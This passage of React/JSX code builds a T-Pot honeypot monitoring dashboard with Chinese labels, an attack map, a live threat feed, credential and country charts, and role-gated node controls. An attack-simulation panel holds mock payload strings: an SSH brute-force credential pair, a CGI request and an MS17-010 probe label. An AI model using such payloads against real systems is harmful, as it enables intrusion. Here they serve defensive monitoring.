      {/* Dynamic Floating Action Toasts */}
      <AnimatePresence>
        {toastMessage && (
          <motion.div
            initial={{ opacity: 0, y: -20, scale: 0.95 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            exit={{ opacity: 0, y: -10, scale: 0.95 }}
            className={cn(
              "fixed top-4 right-4 z-50 px-5 py-4 rounded-xl shadow-2xl border flex items-center gap-3 backdrop-blur-md max-w-md",
              toastMessage.type === 'success' && "bg-emerald-950/80 border-emerald-500/30 text-emerald-300",
              toastMessage.type === 'danger' && "bg-rose-950/80 border-rose-500/30 text-rose-300",
              toastMessage.type === 'warning' && "bg-amber-950/80 border-amber-500/30 text-amber-300",
              toastMessage.type === 'info' && "bg-indigo-950/80 border-indigo-500/30 text-indigo-300"
            )}
          >
            {toastMessage.type === 'success' && <ShieldCheck className="text-emerald-400 w-5 h-5 flex-shrink-0 animate-bounce" />}
            {toastMessage.type === 'danger' && <ShieldAlert className="text-rose-400 w-5 h-5 flex-shrink-0 animate-ping" />}
            {toastMessage.type === 'warning' && <AlertTriangle className="text-amber-400 w-5 h-5 flex-shrink-0" />}
            {toastMessage.type === 'info' && <Activity className="text-indigo-400 w-5 h-5 flex-shrink-0" />}
            
            <div className="text-xs font-bold leading-relaxed">{toastMessage.text}</div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* TOPBAR MODULE */}
      <header className="sticky top-0 z-40 bg-[#0d1017]/95 border-b border-gray-850 backdrop-blur px-6 py-4 flex flex-col md:flex-row items-center justify-between gap-4">
        
        {/* Left Side Branding */}
        <div className="flex items-center gap-3.5">
          <div className="relative">
            <div className="w-10 h-10 bg-[#FF3366]/10 border border-[#FF3366]/30 rounded-xl flex items-center justify-center">
              <Flame className="w-5 h-5 text-[#FF3366] animate-pulse" />
            </div>
            {currentUserRole !== 'Auditor' && (
              <span className="absolute -bottom-0.5 -right-0.5 count-badge w-3 h-3 rounded-full bg-[#10B981] border-2 border-[#07090e] animate-ping"></span>
            )}
          </div>
          <div>
            <div className="flex items-center gap-2">
              <span className="text-sm font-black tracking-widest text-white uppercase font-mono">{getLoc('title')}</span>
              <span className="text-[9px] bg-red-600/10 text-red-500 font-bold px-1.5 py-0.5 rounded border border-red-500/20">{getLoc('subtitle')}</span>
            </div>
            <p className="text-[10px] text-gray-500 font-mono tracking-tight">{getLoc('desc')}</p>
          </div>
        </div>

        {/* Global Search and Toggles */}
        <div className="flex flex-wrap items-center gap-4 w-full md:w-auto">
          
          {/* Quick Find Bar */}
          <div className="relative flex-1 md:flex-initial text-gray-200">
            <Search className="absolute left-3 top-2.5 h-4 w-4 text-gray-500" />
            <input 
              type="text"
              placeholder={getLoc('search_placeholder')}
              value={globalSearch}
              onChange={(e) => setGlobalSearch(e.target.value)}
              className="w-full md:w-64 pl-9 pr-4 py-2 bg-black border border-gray-800 hover:border-gray-700/80 focus:border-red-500/50 rounded-xl text-xs text-white outline-none transition-all placeholder:text-[11px]"
            />
          </div>

          {/* Synth Beep Tone Toggler */}
          {currentUserRole !== 'Auditor' && (
            <button
              onClick={() => {
                setSynthSoundEnabled(prev => !prev);
                showToast(!synthSoundEnabled ? '熱音頻率反饋：已開啟自律漏洞聲波監聽' : '探針防禦聲控靜音', 'info');
              }}
              className="p-2.5 bg-gray-900 hover:bg-gray-850 border border-gray-800 rounded-xl hover:border-gray-700 text-gray-400 hover:text-white transition-all cursor-pointer"
              title={synthSoundEnabled ? "Mute Sonic Alert" : "Unmute Sonic Alert"}
            >
              {synthSoundEnabled ? <Volume2 size={15} className="text-red-400 animate-pulse" /> : <VolumeX size={15} />}
            </button>
          )}

          {/* Severity status */}
          <div 
            onClick={() => {
              if (currentUserRole === 'Auditor') {
                showToast('唯讀模式：稽核登入狀態下不允許手動配置威脅演練級別', 'warning');
                return;
              }
              const stages: ('STABLE' | 'HIGH' | 'CRITICAL')[] = ['STABLE', 'HIGH', 'CRITICAL'];
              const text = stages[(stages.indexOf(globalThreatLevel) + 1) % 3];
              setGlobalThreatLevel(text);
              showToast(`手動演練：威脅等級已被變更至 ${text}`, 'warning');
            }}
            className={cn(
              "px-3 py-1.5 rounded-xl border font-black uppercase text-[10px] font-mono flex items-center gap-2 cursor-pointer transition-all select-none",
              globalThreatLevel === 'CRITICAL' && "bg-red-500/10 text-red-500 border-red-500/30 hover:bg-red-500/25 shadow-md shadow-red-500/10",
              globalThreatLevel === 'HIGH' && "bg-orange-500/10 text-orange-400 border-orange-500/30 hover:bg-orange-500/25",
              globalThreatLevel === 'STABLE' && "bg-emerald-500/10 text-emerald-400 border-emerald-500/30 hover:bg-emerald-500/25"
            )}
          >
            <span className="w-2 h-2 rounded-full bg-current animate-ping"></span>
            {getLoc('threat_level')}：{globalThreatLevel}
          </div>

          <div className="h-6 w-px bg-gray-800 hidden md:block"></div>

          {/* RBAC ROLE SELECTOR DROP DOWN */}
          <div className="relative">
            <button
              onClick={() => setIsRoleDropdownOpen(!isRoleDropdownOpen)}
              className="px-4 py-2 bg-gray-900 hover:bg-gray-850 focus:border-yellow-500/40 border border-gray-800 rounded-xl text-xs text-white font-medium transition-all flex items-center gap-2 cursor-pointer"
            >
              <User size={14} className="text-yellow-400" />
              <span>{getLoc('role_switch')}: <strong className="text-yellow-400">{currentUserRole === 'Admin' ? getLoc('admin') : currentUserRole === 'Analyst' ? getLoc('analyst') : getLoc('auditor')}</strong></span>
              <ChevronDown size={12} className={cn("text-gray-400 transition-transform", isRoleDropdownOpen && "rotate-180")} />
            </button>

            {isRoleDropdownOpen && (
              <>
                <div className="fixed inset-0 z-40" onClick={() => setIsRoleDropdownOpen(false)} />
                <div className="absolute right-0 mt-2 w-48 bg-gray-950 border border-gray-850 rounded-xl shadow-2xl overflow-hidden z-50 py-1.5">
                  {(['Admin', 'Analyst', 'Auditor'] as RBACRole[]).map(role => (
                    <button
                      key={role}
                      onClick={() => {
                        setCurrentUserRole(role);
                        setIsRoleDropdownOpen(false);
                      }}
                      className={cn(
                        "w-full text-left px-4 py-2 text-xs transition-colors cursor-pointer flex items-center justify-between",
                        currentUserRole === role 
                          ? "bg-yellow-500/15 text-yellow-400 font-bold"
                          : "text-gray-400 hover:text-white hover:bg-gray-900"
                      )}
                    >
                      <span>{role === 'Admin' ? getLoc('admin') : role === 'Analyst' ? getLoc('analyst') : getLoc('auditor')}</span>
                      {currentUserRole === role && <span className="w-1.5 h-1.5 rounded-full bg-yellow-400" />}
                    </button>
                  ))}
                </div>
              </>
            )}
          </div>

        </div>
      </header>

      {/* CORE SPLIT WORKSPACE GRID layout with a side menu */}
      <div className="max-w-[1600px] mx-auto px-6 mt-6 grid grid-cols-1 lg:grid-cols-5 gap-8 items-start">
        
        {/* SIDEBAR NAVIGATION COLUMN (LEFT 1 COLUMN) */}
        <aside className="lg:col-span-1 space-y-6">
          <div className="bg-[#0c0f16] border border-gray-850 rounded-2xl p-4 space-y-2">
            <span className="text-[10px] uppercase font-black text-gray-500 tracking-widest px-3 block mb-4 font-mono">
              {currentLang.startsWith('zh') ? '主選單導航' : currentLang.startsWith('ja') ? 'メインメニュー' : 'Main Navigator'}
            </span>

            {getSidebarTabs().map(tab => (
              <button
                key={tab.id}
                onClick={() => {
                  if (tab.isDisabled) {
                    showToast('提示：系統/帳號進階設定已反灰。分析師無邊緣 FW 或 API 變更特權。', 'warning');
                    return;
                  }
                  setActiveTab(tab.id);
                  setExpandedLogId(null);
                }}
                disabled={false} // Click on it to prompt helpful message
                className={cn(
                  "w-full text-left px-4 py-3 rounded-xl transition-all flex flex-col justify-start relative group",
                  tab.isDisabled && "opacity-40 cursor-not-allowed hover:bg-transparent hover:text-gray-400",
                  !tab.isDisabled && "cursor-pointer",
                  activeTab === tab.id 
                    ? "bg-[#FF3366]/10 text-[#FF3366] border border-[#FF3366]/20 font-bold shadow-lg shadow-[#FF3366]/5"
                    : !tab.isDisabled ? "text-gray-400 hover:text-white hover:bg-gray-900/50 border border-transparent" : "text-gray-500"
                )}
              >
                {/* Visual cursor strip inside chosen link */}
                {activeTab === tab.id && (
                  <span className="absolute left-0 top-3 bottom-3 w-1.5 bg-[#FF3366] rounded-r-full"></span>
                )}
                <span className="text-[13px] font-bold block">{tab.label}</span>
                <span className="text-[9px] text-gray-500 font-mono uppercase group-hover:text-gray-400 transition-colors mt-0.5">{tab.desc}</span>
              </button>
            ))}
          </div>

          {/* Core Telemetry Health panel card */}
          <div className="bg-gradient-to-br from-[#0c0f16] to-[#080a0f] border border-gray-850 rounded-2xl p-5 space-y-4">
            <h4 className="text-[10px] uppercase font-black text-gray-500 tracking-wider font-mono flex items-center justify-between">
              <span>ELK 集群狀態</span>
              <span className="text-[#10B981] font-bold">● HEALTHY</span>
            </h4>
            <div className="space-y-3">
              <div>
                <div className="flex justify-between text-[11px] font-mono text-gray-400 mb-1">
                  <span>ES 索引容量</span>
                  <span className="text-white font-bold">142.8 GB / 500G</span>
                </div>
                <div className="w-full bg-black/50 h-1.5 rounded-full overflow-hidden border border-gray-850">
                  <div className="bg-blue-500 h-full rounded-full" style={{ width: '28%' }} />
                </div>
              </div>
              <div>
                <div className="flex justify-between text-[11px] font-mono text-gray-400 mb-1">
                  <span>Logstash 調度負載</span>
                  <span className="text-white font-bold">154 eps</span>
                </div>
                <div className="w-full bg-black/50 h-1.5 rounded-full overflow-hidden border border-gray-850">
                  <div className="bg-[#10B981] h-full rounded-full" style={{ width: '12%' }} />
                </div>
              </div>
            </div>
            <div className="text-[9px] text-gray-500 bg-black/40 p-2 border border-gray-900/80 rounded-lg text-center leading-relaxed">
              當前蜜罐防區已覆蓋全球 <span className="text-white font-bold">12 個</span> 自治節點，已開啟自動化防禦。
            </div>
          </div>
        </aside>

        {/* MAIN CONFIGURATION CONTENT VIEWPORT (RIGHT 4 COLUMNS) */}
        <main className="lg:col-span-4 space-y-8 min-h-[600px]">
          
          {/* TAB A: THE INTERACTIVE GRAPHIC DASHBOARD */}
          {activeTab === 'dashboard' && (
            <div className="space-y-8 animate-fadeIn">
              
              {/* TOP KPI COUNTER METRIC row */}
              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
                
                <div className="bg-[#0f121d] border border-gray-850 p-5 rounded-2xl relative overflow-hidden group">
                  <div className="absolute top-0 right-0 w-16 h-16 bg-[#FF3366]/2 rounded-full blur-2xl pointer-events-none"></div>
                  <div className="text-[10px] font-black text-gray-500 uppercase tracking-widest font-mono mb-2">
                    今日誘捕攻擊次數
                  </div>
                  <div className="text-2xl font-black text-white font-mono tracking-tight flex items-baseline gap-2">
                    {totalAttacks.toLocaleString()}
                    <span className="text-xs text-rose-500 font-bold flex items-center">
                      ▲ 14.2%
                    </span>
                  </div>
                  <p className="text-[10px] text-gray-500 mt-1 uppercase font-mono">ALL DOCKER HONEYPOTS INGESTION</p>
                </div>

                <div className="bg-[#0f121d] border border-gray-850 p-5 rounded-2xl relative overflow-hidden group">
                  <div className="absolute top-0 right-0 w-16 h-16 bg-blue-500/2 rounded-full blur-2xl pointer-events-none"></div>
                  <div className="text-[10px] font-black text-gray-500 uppercase tracking-widest font-mono mb-2">
                    不重複攻擊來源 IP
                  </div>
                  <div className="text-2xl font-black text-white font-mono tracking-tight flex items-baseline gap-2">
                    {uniqueIps.toLocaleString()}
                    <span className="text-xs text-[#00FF66] font-bold flex items-center">
                      ▲ 5.8%
                    </span>
                  </div>
                  <p className="text-[10px] text-gray-500 mt-1 uppercase font-mono">GEOLOCATIONS CAPTURED</p>
                </div>

                <div className="bg-[#0f121d] border border-gray-850 p-5 rounded-2xl relative overflow-hidden group">
                  <div className="absolute top-0 right-0 w-16 h-16 bg-amber-500/2 rounded-full blur-2xl pointer-events-none"></div>
                  <div className="text-[10px] font-black text-gray-500 uppercase tracking-widest font-mono mb-2">
                     活躍捕獲惡意軟體
                  </div>
                  <div className="text-2xl font-black text-[#FFB000] font-mono tracking-tight flex items-baseline gap-2">
                    {malwareCaptured.toLocaleString()}
                    <span className="text-xs text-[#FFB000] font-bold flex items-center">
                      ▲ 22.1%
                    </span>
                  </div>
                  <p className="text-[10px] text-gray-500 mt-1 uppercase font-mono">SHA256 SAMPLES DISCOVERED</p>
                </div>

                <div className="bg-[#0f121d] border border-gray-850 p-5 rounded-2xl relative overflow-hidden group">
                  <div className="absolute top-0 right-0 w-16 h-16 bg-[#10B981]/2 rounded-full blur-2xl pointer-events-none"></div>
                  <div className="text-[10px] font-black text-gray-500 uppercase tracking-widest font-mono mb-2">
                     分散式蜜罐節點
                  </div>
                  <div className="text-2xl font-black text-[#10B981] font-mono tracking-tight flex items-baseline gap-2">
                    {nodes.filter(n => n.status === 'Online').length} / {nodes.length}
                    <span className="text-[11px] font-mono font-bold text-gray-500">
                      ON SERVICE
                    </span>
                  </div>
                  <p className="text-[10px] text-gray-500 mt-1 uppercase font-mono">1 DISCONNECTED NODE</p>
                </div>

              </div>

              {/* WORLD ATTACK MAP DISPLAY (60%) AND REALTIME FEED LOGS (40%) */}
              <div className="grid grid-cols-1 xl:grid-cols-5 gap-6 items-stretch">
                
                {/* LEFT PORTION: 3D MAP VISUALIZER */}
                <div className="xl:col-span-3 bg-[#0d1017] border border-gray-850 rounded-2xl p-6 relative overflow-hidden flex flex-col justify-between">
                  <div className="absolute top-0 right-0 w-64 h-64 bg-[#FF3366]/2 rounded-full blur-3xl pointer-events-none"></div>
                  <div className="flex items-center justify-between border-b border-gray-900 pb-3 mb-4">
                    <div className="flex items-center gap-2">
                      <Globe size={16} className="text-[#FF3366]" />
                      <h3 className="text-xs uppercase font-black font-mono tracking-wider text-white">
                        Global Active Attack Source Map (地理坐標威脅熱點)
                      </h3>
                    </div>
                    <div className="flex items-center gap-2">
                      <button
                        onClick={() => setActiveTab('attack-map')}
                        className="text-[10px] font-mono font-bold text-[#FF3366] bg-[#FF3366]/10 hover:bg-[#FF3366]/20 border border-[#FF3366]/30 px-2.5 py-1 rounded-lg uppercase flex items-center gap-1.5 transition-all shadow-sm"
                      >
                        <Crosshair size={12} />
                        <span>開啟全螢幕戰局地圖</span>
                      </button>
                      <span className="text-[9px] font-mono bg-black/40 border border-gray-800 px-2 py-0.5 rounded uppercase font-black text-emerald-400">
                        LIVE
                      </span>
                    </div>
                  </div>

                  {/* interactive map element */}
                  <div className="bg-black/60 rounded-xl border border-gray-850/60 flex items-center justify-center p-4 relative min-h-[300px]">
                    <ComposableMap 
                      projectionConfig={{ scale: 190, center: [20, 10] }}
                      className="w-full h-full max-h-[360px]"
                    >
                      <Geographies geography={geoUrl}>
                        {({ geographies }) =>
                          geographies.map((geo) => (
                            <Geography
                              key={geo.rsmKey}
                              geography={geo}
                              fill="#101319"
                              stroke="#222b37"
                              strokeWidth={0.5}
                              style={{
                                default: { outline: "none" },
                                hover: { fill: "#1e2430", outline: "none" },
                                pressed: { outline: "none" },
                              }}
                            />
                          ))
                        }
                      </Geographies>

                      {/* Mock Interactive attackers coordinates dynamic light arcs linking to HIVE-MAIN */}
                      <MapLine from={[116.4, 39.9]} to={[121.5, 25.0]} stroke="#EF4444" strokeWidth={1} strokeLinecap="round" strokeDasharray="3,3" /> {/* China to S-Taipei */}
                      <MapLine from={[37.6, 55.7]} to={[121.5, 25.0]} stroke="#EF4444" strokeWidth={1.5} strokeLinecap="round" /> {/* Moscow to Taipei */}
                      <MapLine from={[-74.0, 40.7]} to={[121.5, 25.0]} stroke="#3B82F6" strokeWidth={1} strokeLinecap="round" /> {/* US to Taipei */}
                      <MapLine from={[126.9, 37.5]} to={[121.5, 25.0]} stroke="#EF4444" strokeWidth={1} strokeLinecap="round" /> {/* Seoul to Taipei */}
                      <MapLine from={[77.2, 28.6]} to={[121.5, 25.0]} stroke="#EF4444" strokeWidth={1} strokeLinecap="round" /> {/* N.Delhi to Taipei */}
                      <MapLine from={[-43.1, -22.9]} to={[121.5, 25.0]} stroke="#F59E0B" strokeWidth={1} strokeLinecap="round" /> {/* Rio to Taipei */}

                      {/* Target Hub central Node: S-Taipei */}
                      <Marker coordinates={[121.5, 25.0]}>
                        <circle r={6} fill="#FF3366" className="animate-ping" style={{ animationDuration: '2s' }} />
                        <circle r={3} fill="#FF3366" stroke="#fff" strokeWidth={1} />
                      </Marker>

                      {/* Source Attack node logs */}
                      <Marker coordinates={[116.4, 39.9]}><circle r={2.5} fill="#EF4444" /></Marker>
                      <Marker coordinates={[37.6, 55.7]}><circle r={2.5} fill="#EF4444" /></Marker>
                      <Marker coordinates={[-74.0, 40.7]}><circle r={2} fill="#3B82F6" /></Marker>
                      <Marker coordinates={[126.9, 37.5]}><circle r={2} fill="#EF4444" /></Marker>
                      <Marker coordinates={[77.2, 28.6]}><circle r={2} fill="#EF4444" /></Marker>
                      <Marker coordinates={[-43.1, -22.9]}><circle r={2} fill="#F59E0B" /></Marker>

                    </ComposableMap>

                    {/* Threat geographic coordinates map overlays */}
                    <div className="absolute right-3 bottom-3 bg-black/80 border border-gray-800 rounded-lg p-3 text-[10px] font-mono space-y-1 z-10 select-none">
                      <span className="text-gray-500 uppercase tracking-wider block font-bold mb-1">C2 Target Platform</span>
                      <div className="flex items-center gap-1.5"><span className="w-1.5 h-1.5 rounded-full bg-[#FF3366]"></span><span>Taipei Honey Hive (121.5, 25.0)</span></div>
                      <div className="flex items-center gap-1.5"><span className="w-1.5 h-1.5 rounded-full bg-[#EF4444]"></span><span>Malicious Intrusions (Active)</span></div>
                      <div className="flex items-center gap-1.5"><span className="w-1.5 h-1.5 rounded-full bg-[#3B82F6]"></span><span>Passive Port Scanners</span></div>
                    </div>
                  </div>

                  {/* Manual Intrusion simulator controller panel */}
                  <div className="mt-4 flex flex-col sm:flex-row items-center justify-between bg-[#111622] p-3 rounded-xl border border-gray-850 gap-3">
                    <div className="text-[10px] text-gray-400 font-mono">
                      【人工演練控制台】選擇一個區域，手動對 T-Pot 發送一次密碼猜測與惡意 Shell 突襲：
                    </div>
                    <div className="flex gap-2">
                      {[
                        { label: '🇷🇺 俄羅斯 SSH 爆破', ip: '185.195.233.102', country: 'Russia', code: 'RU', honeypot: 'Cowrie', payload: 'USER="root" PASS="admin112" (T-Pot Blocked)' },
                        { label: '🇨🇳 中國 80 端口溢出', ip: '222.186.42.15', country: 'China', code: 'CN', honeypot: 'Glastopf', payload: 'GET /cgi-bin/test.cgi?payload=bin/' },
                        { label: '🇺🇸 美國 SMB 探針', ip: '52.92.15.221', country: 'United States', code: 'US', honeypot: 'Dionaea', payload: 'MS17-010 SMB exploit probe' }
                      ].map((sim, index) => (
                        <button
                          key={index}
                          onClick={() => {
                            const customLog: HoneypotEvent = {
                              id: `LOG-SIM-${Date.now().toString().slice(-3)}`,
                              time: new Date().toTimeString().split(' ')[0],
                              node: 'HIVE-MAIN-01',
                              ip: sim.ip,
                              country: sim.country,
                              countryCode: sim.code,
                              protocol: sim.honeypot === 'Cowrie' ? 'SSH/22' : sim.honeypot === 'Glastopf' ? 'HTTP/80' : 'SMB/445',
                              honeypot: sim.honeypot,
                              payload: sim.payload,
                              severity: 'Critical',
                              actionTaken: 'Trapped'
                            };
                            setLogs(prev => [customLog, ...prev]);
                            setTotalAttacks(prev => prev + 1);
                            showToast(`【攻擊模擬】自 ${sim.country} 來源 IP [${sim.ip}] 的安全漏洞特徵已被成功誘捕！`, 'danger');
                          }}
                          className="px-2.5 py-1.5 bg-gray-900 border border-gray-800 hover:bg-gray-800 text-gray-300 hover:text-white rounded-lg text-[10px] font-bold transition-all cursor-pointer"
                        >
                          {sim.label}
                        </button>
                      ))}
                    </div>
                  </div>

                </div>

                {/* RIGHT PORTION: LIVESTREAM FEED LIST TIMELINE (40%) */}
                <div className="xl:col-span-2 bg-[#0d1017] border border-gray-850 rounded-2xl p-6 relative overflow-hidden flex flex-col justify-between">
                  <div className="absolute top-0 right-0 w-64 h-64 bg-red-500/2 rounded-full blur-3xl pointer-events-none"></div>
                  
                  <div className="flex items-center justify-between border-b border-gray-900 pb-3 mb-4">
                    <div className="flex items-center gap-2">
                      <TerminalIcon size={16} className="text-[#EF4444]" />
                      <h3 className="text-xs uppercase font-black font-mono tracking-wider text-white">
                        Live Attack Feed logs (即時威脅告警串流)
                      </h3>
                    </div>
                    <span className="w-2.5 h-2.5 rounded-full bg-red-500 animate-ping"></span>
                  </div>

                  {/* Scrollable feed logger list */}
                  <div className="flex-1 space-y-3 overflow-y-auto max-h-[350px] pr-2 custom-scrollbar">
                    <AnimatePresence>
                      {filteredLogs.slice(0, 7).map((log, i) => (
                        <motion.div
                          key={log.id}
                          initial={{ opacity: 0, x: 20 }}
                          animate={{ opacity: 1, x: 0 }}
                          exit={{ opacity: 0 }}
                          className={cn(
                            "p-3 bg-black/40 hover:bg-black/80 rounded-xl border transition-all duration-200 flex flex-col space-y-2 relative group",
                            log.actionTaken === 'Blocked' 
                              ? "border-[#10B981]/30 opacity-60" 
                              : log.severity === 'Critical' 
                              ? "border-red-500/10 hover:border-red-500/25" 
                              : "border-gray-800 hover:border-gray-700"
                          )}
                        >
                          {/* Top line metadata description */}
                          <div className="flex items-center justify-between">
                            <div className="flex items-center gap-2 text-[10px] font-mono">
                              <span className="text-gray-500">{log.time}</span>
                              <span className="text-gray-600">•</span>
                              <span className="text-[#FF3366] font-bold">{log.node}</span>
                              <span className="text-gray-600">•</span>
                              <span className="text-gray-300 bg-gray-900 px-1.5 py-0.5 rounded border border-gray-850">{log.protocol}</span>
                            </div>
                            <span className={cn(
                              "text-[8px] font-mono font-black uppercase px-2 py-0.5 rounded",
                              log.actionTaken === 'Blocked' 
                                ? "bg-[#10B981]/15 text-[#10B981] border border-[#10B981]/20" 
                                : log.severity === 'Critical' 
                                ? "bg-red-500/15 text-red-400 border border-red-500/20" 
                                : log.severity === 'High' 
                                ? "bg-orange-500/15 text-orange-400 border border-orange-500/20" 
                                : "bg-blue-500/15 text-blue-400 border border-blue-500/20"
                            )}>
                              {log.actionTaken === 'Blocked' ? '🔥 BLOCKED' : log.severity}
                            </span>
                          </div>

                          {/* IP and Country tag */}
                          <div className="flex items-center justify-between">
                            <div className="flex items-center gap-2">
                              <span className="text-xs font-mono font-black text-white hover:text-red-400 transition-colors select-all">
                                {log.ip}
                              </span>
                              <span className="text-[9px] text-gray-500">
                                ({log.country})
                              </span>
                            </div>
                            
                            {/* Inline direct Firewall Block Button */}
                            {log.actionTaken !== 'Blocked' && (
                              <button
                                onClick={() => handleBlockAddress(log.ip)}
                                className="opacity-0 group-hover:opacity-100 px-2 py-1 bg-red-650/15 hover:bg-red-600 border border-red-500/30 text-white font-bold rounded-lg text-[8px] uppercase tracking-wider transition-all cursor-pointer flex items-center gap-1"
                                title="一鍵邊緣防火牆阻斷"
                              >
                                <ShieldAlert size={10} />
                                一鍵阻斷
                              </button>
                            )}
                          </div>

                          {/* Raw exploit command description */}
                          <div className="text-[10px] text-gray-400 font-mono bg-[#07090e] p-2 rounded border border-gray-900 overflow-x-auto selection:bg-gray-800">
                            {log.payload}
                          </div>
                        </motion.div>
                      ))}
                    </AnimatePresence>
                  </div>

                  {/* View all logs indicator link */}
                  <div className="pt-3 border-t border-gray-900 mt-2 text-center">
                    <button
                      onClick={() => setActiveTab('logs')}
                      className="text-[10px] font-bold text-gray-500 hover:text-[#FF3366] transition-colors uppercase tracking-widest flex items-center justify-center gap-1.5 mx-auto cursor-pointer"
                    >
                      <span>檢索所有歷史 Elastic 捕獲日誌</span>
                      <ExternalLink size={10} />
                    </button>
                  </div>

                </div>

              </div>

              {/* BOTTOM SECTION: GEOGRAPHIC DONUT CHART (50%) AND PASSWORD DICTIONARY TACKLERS (50%) */}
              <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
                
                {/* 1. PIE CHART REPORT */}
                <div className="bg-[#0d1017] border border-gray-850 rounded-2xl p-6 relative overflow-hidden">
                  <div className="absolute top-0 right-0 w-48 h-48 bg-blue-500/2 rounded-full blur-3xl pointer-events-none"></div>
                  <div className="flex items-center justify-between border-b border-gray-900 pb-3 mb-6">
                    <div className="flex items-center gap-2">
                      <Globe size={16} className="text-[#3B82F6]" />
                      <h4 className="text-xs uppercase font-black tracking-wider text-white">
                        Top Attack Source Countries (攻擊來源國分佈 Top 7)
                      </h4>
                    </div>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4 items-center">
                    
                    {/* Pie charts visual rendering */}
                    <div className="h-48 flex items-center justify-center">
                      <ResponsiveContainer width="100%" height="100%">
                        <PieChart>
                          <Pie
                            data={countryDistribution}
                            cx="50%"
                            cy="50%"
                            innerRadius={55}
                            outerRadius={80}
                            paddingAngle={3}
                            dataKey="value"
                          >
                            {countryDistribution.map((entry, index) => (
                              <Cell key={`cell-${index}`} fill={COLOR_PALETTE[index % COLOR_PALETTE.length]} />
                            ))}
                          </Pie>
                          <Tooltip 
                            contentStyle={{ backgroundColor: '#07090e', borderColor: '#1f2937', color: '#fff', fontSize: '11px' }}
                            formatter={(value: any) => [`${(Number(value) / 1000).toFixed(1)}k Hits`, '攻擊數']}
                          />
                        </PieChart>
                      </ResponsiveContainer>
                    </div>

                    {/* Right side color guides */}
                    <div className="space-y-2">
                      {countryDistribution.map((item, index) => {
                        const percent = ((item.value / 1284510) * 100).toFixed(1);
                        return (
                          <div key={item.name} className="flex items-center justify-between text-xs font-mono">
                            <div className="flex items-center gap-2 text-gray-300">
                              <span className="w-2.5 h-2.5 rounded" style={{ backgroundColor: COLOR_PALETTE[index % COLOR_PALETTE.length] }} />
                              <span>{item.name}</span>
                            </div>
                            <div className="text-right flex items-center gap-3">
                              <span className="text-gray-500 font-bold">{(item.value / 1000).toFixed(1)}k</span>
                              <span className="text-white font-bold">{percent}%</span>
                            </div>
                          </div>
                        );
                      })}
                    </div>

                  </div>
                </div>

                {/* 2. TOP PASSWORD CREDENTIAL BAR CHART REPORT */}
                <div className="bg-[#0d1017] border border-gray-850 rounded-2xl p-6 relative overflow-hidden">
                  <div className="absolute top-0 right-0 w-48 h-48 bg-[#FFB000]/2 rounded-full blur-3xl pointer-events-none"></div>
                  <div className="flex items-center justify-between border-b border-gray-900 pb-3 mb-6">
                    <div className="flex items-center gap-2">
                      <Key size={16} className="text-[#FFB000]" />
                      <h4 className="text-xs uppercase font-black tracking-wider text-white">
                        Top Username / Password Combos Dictionaries (駭客登入字典 Top 7)
                      </h4>
                    </div>
                  </div>

                  {/* Recharts horizontal Bar Chart */}
                  <div className="h-48">
                    <ResponsiveContainer width="100%" height="105%">
                      <BarChart 
                        data={credentials}
                        layout="vertical"
                        margin={{ top: 5, right: 5, left: -20, bottom: 5 }}
                      >
                        <XAxis type="number" stroke="#4b5563" fontSize={10} hide />
                        <YAxis 
                          type="category" 
                          dataKey="id" 
                          stroke="#6b7280" 
                          fontSize={9} 
                          tickFormatter={(id) => {
                            const c = credentials.find(x => x.id === id);
                            return c ? `${c.username}:${c.password}` : id;
                          }}
                        />
                        <Tooltip
                          contentStyle={{ backgroundColor: '#07090e', borderColor: '#1f2937', color: '#fff', fontSize: '11px' }}
                          formatter={(value: any) => [`${value} 次嘗試`, '捕獲次數']}
                        />
                        <Bar dataKey="count" fill="#3B82F6" radius={[0, 4, 4, 0]}>
                          {credentials.map((entry, index) => (
                            <Cell key={`cell-${index}`} fill={index === 0 ? '#EF4444' : index === 1 ? '#F97316' : '#3B82F6'} />
                          ))}
                        </Bar>
                      </BarChart>
                    </ResponsiveContainer>
                  </div>
                </div>

              </div>

            </div>
          )}

          {/* TAB: DEDICATED T-POT REALTIME ATTACK MAP (FULL-FEATURED) */}
          {activeTab === 'attack-map' && (
            <div className="animate-fadeIn">
              <TPotAttackMapTab 
                onNotify={(text, type) => showToast(text, type)}
                synthSoundEnabled={synthSoundEnabled}
              />
            </div>
          )}

          {/* TAB B: DISTRIBUTED NODE TELEMETRY AND MANAGEMENT */}
          {activeTab === 'nodes' && (
            <div className="space-y-6 animate-fadeIn">
              
              {/* Nodes header tool bar */}
              <div className="flex flex-col sm:flex-row items-stretch sm:items-center justify-between gap-4 bg-[#0d1017] border border-gray-850 p-4 rounded-2xl">
                <div>
                  <h3 className="text-sm font-black text-white uppercase font-mono tracking-wider">
                    分散式安全威脅探針節點 (T-Pot Distributed Clusters)
                  </h3>
                  <p className="text-[11px] text-gray-500 font-mono">
                    監測實時硬體指標。分析師及管理員均可一鍵下發重啟 Docker 或進入命令行。
                  </p>
                </div>
                
                {/* Quick actions for Admins */}
                <div className="flex gap-2">
                  <button
                    onClick={() => {
                      if (currentUserRole !== 'Admin') {
                        showToast('拒絕操作：非 Administrator 角色不可新增蜜罐節點。', 'warning');
                        return;
                      }
                      setShowAddNodeModal(true);
                    }}
                    className="px-4 py-2 bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 border border-red-500/20 text-white text-xs font-bold rounded-xl flex items-center gap-1.5 cursor-pointer shadow-lg shadow-red-600/10"
                  >
                    <PlusCircle size={14} />
                    <span>新增 T-Pot 蜜罐節點</span>
                  </button>
                  
                  <button
                    onClick={() => {
                      if (currentUserRole !== 'Admin') {
                        showToast('特別限制：只有系統管理員（Admin）可執行批次重設蜜罐集群。', 'warning');
                        return;
                      }
                      showToast('發送全局批次 Docker 容器更新訊號中...', 'info');
                      setTimeout(() => showToast('全網活躍探針容器升級刷新成功！', 'success'), 2000);
                    }}
                    disabled={currentUserRole !== 'Admin'}
                    className={cn(
                      "px-3.5 py-2 rounded-xl text-xs font-bold transition-all flex items-center gap-1.5",
                      currentUserRole !== 'Admin'
                        ? "bg-gray-950 text-gray-600 border border-transparent opacity-50 cursor-not-allowed"
                        : "bg-gray-900 border border-gray-850 hover:bg-gray-850 text-gray-300 hover:text-white cursor-pointer"
                    )}
                    title={currentUserRole !== 'Admin' ? "僅限系統管理員操作" : "批次重新啟動全網容器服務"}
                  >
